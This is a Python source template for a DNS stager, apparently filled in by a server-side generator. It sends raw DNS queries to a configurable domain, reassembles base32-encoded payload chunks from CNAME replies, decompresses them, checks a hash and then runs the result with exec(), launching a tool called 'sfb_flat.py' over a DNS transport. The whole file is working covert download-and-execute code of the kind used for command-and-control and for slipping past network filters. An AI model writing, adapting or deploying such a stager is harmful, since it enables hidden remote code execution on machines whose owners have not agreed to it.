# -*- coding: ascii -*-
# DNS stager template. Rendered by server-side generator.

import base64
import hashlib
import random
import re
import select
import socket
import struct
import subprocess
import sys
import time
import zlib

BASE_DOMAIN = '{{BASE_DOMAIN}}'
CNAME_SUFFIX = '{{CNAME_SUFFIX}}'
STAGER_NONCE = '{{STAGER_NONCE}}'
PAYLOAD_HASH = '{{PAYLOAD_HASH}}'
SFB_ARGS = {{SFB_ARGS}}

COUNT_NAME = '%s.count.%s' % (STAGER_NONCE, BASE_DOMAIN)
PIECE_FMT = '%s.%%05d.%s' % (STAGER_NONCE, BASE_DOMAIN)
TIMEOUT = 2.0
PIPELINE_WINDOW = 8
PIPELINE_RESEND_AFTER = 0.5
PIPELINE_WAIT = 0.2

try:
    text_type = unicode
except NameError:
    text_type = str

try:
    _now = time.monotonic
except AttributeError:
    _now = time.time


def _byte_at(data, index):
    value = data[index]
    if isinstance(value, int):
        return value
    return ord(value)


def _b32decode(text):
    if isinstance(text, bytes):
        text = text.decode('ascii')
    pad = (8 - len(text) % 8) % 8
    text = text.upper() + ('=' * pad)
    return base64.b32decode(text.encode('ascii'))


def _encode_name(name):
    if not name:
        return b'\x00'
    if name.endswith('.'):
        name = name[:-1]
    parts = name.split('.')
    out = []
    for label in parts:
        if not label:
            continue
        if isinstance(label, bytes):
            label_bytes = label
        else:
            label_bytes = label.encode('ascii')
        out.append(struct.pack('B', len(label_bytes)))
        out.append(label_bytes)
    out.append(b'\x00')
    return b''.join(out)


def _read_name(packet, offset):
    labels = []
    jumped = False
    jumps = 0
    next_offset = offset
    while True:
        if offset >= len(packet):
            return None, offset
        length = _byte_at(packet, offset)
        if length == 0:
            offset += 1
            if not jumped:
                next_offset = offset
            break
        if length & 0xC0 == 0xC0:
            if offset + 1 >= len(packet):
                return None, offset
            pointer = ((length & 0x3F) << 8) | _byte_at(packet, offset + 1)
            if not jumped:
                next_offset = offset + 2
            offset = pointer
            jumped = True
            jumps += 1
            if jumps > 10:
                return None, next_offset
            continue
        offset += 1
        if offset + length > len(packet):
            return None, offset
        label = packet[offset:offset + length]
        label_text = label.decode('ascii')
        labels.append(label_text)
        offset += length
        if not jumped:
            next_offset = offset
    return '.'.join(labels), next_offset


def _parse_cname(packet):
    if not packet or len(packet) < 12:
        return None, None
    header = packet[:12]
    _, _, qdcount, ancount, _, _ = struct.unpack('>HHHHHH', header)
    offset = 12
    qname = None
    for _ in range(qdcount):
        name, offset = _read_name(packet, offset)
        if name is None or offset + 4 > len(packet):
            return None, None
        if qname is None:
            qname = name
        offset += 4
    for _ in range(ancount):
        name, offset = _read_name(packet, offset)
        if name is None or offset + 10 > len(packet):
            return qname, None
        rtype, rclass, _, rdlen = struct.unpack('>HHIH', packet[offset:offset + 10])
        offset += 10
        if offset + rdlen > len(packet):
            return qname, None
        if rtype == 5 and rclass == 1:
            cname, _ = _read_name(packet, offset)
            return qname, cname
        offset += rdlen
    return qname, None


def _decode_cname(name):
    if not name:
        return None
    name = name.rstrip('.')
    suffix = CNAME_SUFFIX.rstrip('.')
    lower_name = name.lower()
    lower_suffix = suffix.lower()
    if lower_name == lower_suffix:
        return b''
    suffix = '.' + lower_suffix
    if not lower_name.endswith(suffix):
        return None
    data_part = name[:-len(suffix)]
    if data_part.endswith('.'):
        data_part = data_part[:-1]
    if not data_part:
        return b''
    b32 = ''.join(data_part.split('.'))
    return _b32decode(b32)


def _build_query(name, dns_id=None):
    if dns_id is None:
        dns_id = random.randint(0, 0xFFFF)
    header = struct.pack('>HHHHHH', dns_id, 0x0100, 1, 0, 0, 0)
    question = _encode_name(name) + struct.pack('>HH', 1, 1)
    return dns_id, header + question


def _resolver():
{{RESOLVER_SNIPPET}}


def _query(name, resolver):
    if not resolver:
        return None
    dns_id, packet = _build_query(name)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(TIMEOUT)
    try:
        sock.sendto(packet, (resolver, 53))
        data, _ = sock.recvfrom(4096)
    except (socket.error, OSError):
        return None
    finally:
        sock.close()
    if not data or len(data) < 12:
        return None
    resp_id = struct.unpack('>H', data[:2])[0]
    if resp_id != dns_id:
        return None
    _, cname = _parse_cname(data)
    return cname


def _fetch_count(resolver):
    while True:
        cname = _query(COUNT_NAME, resolver)
        if cname:
            payload = _decode_cname(cname)
            if payload and len(payload) >= 7:
                if payload[:2] != b'SF':
                    pass
                else:
                    version = _byte_at(payload, 2)
                    if version == 1:
                        count = struct.unpack('>I', payload[3:7])[0]
                        if count > 0:
                            return count
        time.sleep(0.1)


def _fetch_chunks(resolver, count):
    chunks = {}
    if count <= 0:
        return chunks
    window = PIPELINE_WINDOW
    if count < window:
        window = count
    pending = {}
    pending_ids = {}
    next_index = 1
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setblocking(0)
    try:
        while len(chunks) < count:
            now = _now()
            while len(pending) < window and next_index <= count:
                index = next_index
                next_index += 1
                name = PIECE_FMT % index
                while True:
                    dns_id, packet = _build_query(name)
                    if dns_id not in pending_ids:
                        break
                try:
                    sock.sendto(packet, (resolver, 53))
                except (socket.error, OSError):
                    pass
                pending[index] = {'id': dns_id, 'last_sent': now}
                pending_ids[dns_id] = index
            pending_indices = []
            for index in pending:
                pending_indices.append(index)
            for index in pending_indices:
                info = pending.get(index)
                if not info:
                    continue
                if now - info['last_sent'] < PIPELINE_RESEND_AFTER:
                    continue
                _, packet = _build_query(PIECE_FMT % index, info['id'])
                try:
                    sock.sendto(packet, (resolver, 53))
                except (socket.error, OSError):
                    pass
                info['last_sent'] = now
            wait = PIPELINE_WAIT
            while True:
                readable, _, _ = select.select([sock], [], [], wait)
                if not readable:
                    break
                wait = 0
                try:
                    data, _ = sock.recvfrom(4096)
                except (socket.error, OSError):
                    break
                if not data or len(data) < 2:
                    continue
                resp_id = struct.unpack('>H', data[:2])[0]
                index = pending_ids.get(resp_id)
                if index is None:
                    continue
                qname, cname = _parse_cname(data)
                if not qname:
                    continue
                expected = PIECE_FMT % index
                if qname.lower() != expected.lower():
                    continue
                if not cname:
                    continue
                payload = _decode_cname(cname)
                if payload is None:
                    continue
                chunks[index] = payload
                del pending_ids[resp_id]
                if index in pending:
                    del pending[index]
    finally:
        sock.close()
    return chunks


def main():
    resolver = _resolver()
    if not resolver:
        return None
    count = _fetch_count(resolver)
    if not count:
        return None
    chunks = _fetch_chunks(resolver, count)
    if len(chunks) != count:
        return None
    parts = []
    for index in range(1, count + 1):
        parts.append(chunks[index])
    data = b''.join(parts)
    payload = zlib.decompress(data, 16 + zlib.MAX_WBITS)
    payload_bytes = payload
    if isinstance(payload_bytes, text_type):
        payload_bytes = payload_bytes.encode('ascii')
    digest = hashlib.sha256(payload_bytes).hexdigest()
    if digest != PAYLOAD_HASH:
        return None
    if isinstance(payload, bytes):
        if sys.version_info[0] >= 3:
            payload = payload.decode('ascii')
    elif not isinstance(payload, text_type):
        payload = payload.decode('ascii')
    return payload


if __name__ == '__main__':
    payload = main()
    if payload:
        sys.argv = [
            'sfb_flat.py',
            '--role',
            'alice',
            '--transport',
            'dns',
            '--domain',
            BASE_DOMAIN,
        ] + SFB_ARGS
        globals()['__name__'] = '__main__'
        globals()['__file__'] = 'sfb_flat.py'
        exec(payload)
